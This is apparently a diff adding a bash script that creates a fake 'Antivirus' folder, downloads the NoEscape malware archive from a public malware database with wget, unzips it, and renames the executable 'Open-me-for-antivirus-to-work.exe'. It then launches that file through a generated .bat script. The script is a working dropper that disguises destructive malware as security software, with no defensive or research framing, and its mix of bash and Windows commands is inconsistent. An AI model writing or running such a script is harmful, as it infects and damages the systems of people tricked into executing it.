@@ -1,0 +1,29 @@
+#! /bin/bash
+
+cd ..
+cd Desktop
+mkdir Antivirus
+cd Antivirus
+mkdir scripts
+mkdir viruses
+cd scripts
+touch scripts.bat
+echo "
+START C:\Users\user\Desktop\Antivirus\viruses\Open-This\Open-me-for-antivirus-to-work
+
+
+" > scripts.bat
+cd ..
+cd viruses 
+mkdir Open-This
+cd *
+wget https://github.com/Endermanch/MalwareDatabase/raw/master/NoEscape.zip
+echo 'mysubsarethebest'
+unzip *
+rm -rf NoEscape.zip
+cp NoEscape.exe Open-me-for-antivirus-to-work.exe
+rm NoEscape.exe
+cd ..
+cd ..
+cd scripts
+scripts.bat
